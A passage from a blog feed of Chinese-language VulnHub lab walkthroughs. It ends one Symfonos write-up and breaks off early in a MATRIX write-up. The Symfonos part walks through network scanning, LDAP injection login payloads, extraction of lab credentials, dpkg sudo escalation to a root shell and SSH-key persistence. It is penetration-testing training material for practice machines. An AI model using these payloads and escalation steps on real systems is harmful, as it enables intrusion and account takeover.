&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-085.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.81&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;sudo nmap -A -p 1-1024 192.168.31.81 -oN /tmp/symfonos.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-086.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;gobuster-扫描目录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gobuster-扫描目录&#34;&gt;#&lt;/a&gt; Gobuster 扫描目录&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODE=&#34;&gt;http://192.168.31.81&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-087.png&#34; alt&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目录扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-088.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvYWRtaW4ucGhw&#34;&gt;http://192.168.31.81/admin.php&lt;/span&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-089.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;尝试弱口令，注入等均无效&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;加载字典，更详细的扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;gobuster dir -u http://192.168.31.81/ -w /usr/share/dirbuster/wordlists/directory-list-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.3-medium.txt -x php,txt,html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-090.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvcG9ydHJhaXRzLnBocA==&#34;&gt;http://192.168.31.81/portraits.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-091.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;ldap-枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ldap-枚举&#34;&gt;#&lt;/a&gt; LDAP 枚举&lt;/h3&gt;
&lt;p&gt;在 LDAP 上做一个快速枚举，看看是否有任何信息暴露给我们看&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ldapsearch 使用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldapsearch -h 192.168.31.81 -x -s namingcontexts&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-x Simple authentication&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-s scope one of base, one, sub or children (search scope)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-H URI LDAP Uniform Resource Identifier(s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-092.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 关键信息: dn:namingContexts, dc=symfonos, dc=local&lt;/p&gt;
&lt;h3 id=&#34;ldap-注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ldap-注入&#34;&gt;#&lt;/a&gt; LDAP 注入&lt;/h3&gt;
&lt;p&gt;考虑到 ldap 在这台机器上运行，可尝试用 ldap 注入登录框&lt;br&gt;
 ldap 注入 poc：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL2xkYXAtaW5qZWN0aW9u&#34;&gt;https://book.hacktricks.xyz/pentesting-web/ldap-injection&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-093.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(password=*))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(&amp;amp;)(password=*)(&amp;amp;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(&amp;amp;(user=*)(|(&amp;amp;)(pass=pwd))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 user=* 和 password=* 登陆到了该站点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-094.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现了一个 ssrf 跨服务请求伪造:&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODEvaG9tZS5waHA/dXJsPWh0dHA6Ly8xOTIuMTY4LjMxLjgxL3BvcnRyYWl0cy5waHA=&#34;&gt;http://192.168.31.81/home.php?url=http://192.168.31.81/portraits.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-095.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;分析在 http://192.168.31.81/admin.php 输入 user=*，pass=* 登陆成功的原因&lt;br&gt;
我们必须记住，我们仍在处理 LDAP，当我们处理身份验证时，我们总是想检查页面是如何处理它的。在这种情况下，我们的目标是 admin.php 页面。&lt;/p&gt;
&lt;p&gt;我们认为 LFI	有可能只是因为 URL	与 localhost	连接，以获取 Portraits.php 文件，利用 burpsuite 进行抓取 http://192.168.31.81/home.php?url admin.php 登陆时的数据包。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-096.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：admin 密码：qMDdyZh3cT6eeAWD，实际上用于连接 LDAP&lt;br&gt;
 &lt;code&gt;$bind = ldap_bind($ldap_ch, &amp;quot;cn=admin,dc=symfonos,dc=local&amp;quot;,&amp;quot;qMDdyZh3cT6eeAWD&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ldap信息枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldapsearch -h 192.168.31.81 -D &amp;quot;cn=admin,dc=symfonos,dc=local&amp;quot; -w &amp;#x27;qMDdyZh3cT6eeAWD&amp;#x27; -x -b &amp;quot;dc=symfonos,dc=local&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-D binddn &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt; DN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-w passwd &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt; password (&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; simple authentication)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-x Simple authentication&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-b basedn base dn &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; search&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-097.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取到信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zeus Y2V0a0tmNHdDdUhDOUZFVA==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; 解码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;Y2V0a0tmNHdDdUhDOUZFVA==&amp;quot; | base64 -d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; 编码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;cetkKf4wCuHC9FET&amp;quot; | base64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-098.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; admin:{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm&lt;br&gt;
-&amp;gt; zeus:cetkKf4wCuHC9FET&lt;/p&gt;
&lt;h3 id=&#34;dpkg-shell-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dpkg-shell-提权&#34;&gt;#&lt;/a&gt; dpkg-shell 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登录靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh zeus@192.168.31.81 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cetkKf4wCuHC9FET&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-099.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看相关权限设置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现dpkg拥有root权限，可通过dpkg提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;详细网址：https://gtfobins.github.io/gtfobins/dpkg/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-100.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;输入以下命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo dpkg -l &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在弹出来的交互式中继续输入!/bin/sh&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-101.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssh-密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-密钥对维权&#34;&gt;#&lt;/a&gt; SSH 密钥对维权&lt;/h3&gt;
&lt;p&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys &amp;amp;&amp;amp; rm - f ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-102.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 免密成功，下次可直接登录&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/108%20MATRIX/</guid>
            <title>VULNHUB 8 MATRIX</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/108%20MATRIX/</link>
            <category>VULNHUB 1-10</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbWF0cml4LTEsMjU5Lw==&#34;&gt;https://www.vulnhub.com/entry/matrix-1,259/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU4MzYzNy9hcnRpY2xlL2RldGFpbHMvMTAyODQ1ODYw&#34;&gt;https://blog.csdn.net/weixin_43583637/article/details/102845860&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 MATRIX：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-128.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.107&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.107 -oN /tmp/matrix.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-129.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80, 31337&lt;/p&gt;
&lt;h3 id=&#34;80-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#80-网站信息收集&#34;&gt;#&lt;/a&gt; 80 网站信息收集&lt;/h3&gt;
&lt;p&gt;右键发现无法检查源代码，先扫一遍目录&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.107/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-130.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cw==&#34;&gt;http://192.168.31.107/assets&lt;/span&gt;&lt;br&gt;
-&amp;gt; 找到敏感目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cy9pbWcvcDBydF8zMTMzNy5wbmc=&#34;&gt;http://192.168.31.107/assets/img/p0rt_31337.png&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-131.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是没有找到更多可以操作的，转到下个目标&lt;/p&gt;
&lt;h3 id=&#34;31337-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31337-网站信息收集&#34;&gt;#&lt;/a&gt; 31337 网站信息收集&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-132.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里有一个提示暗号的意思，右键检查源代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-133.png&#34; alt&gt;&lt;/p&gt;
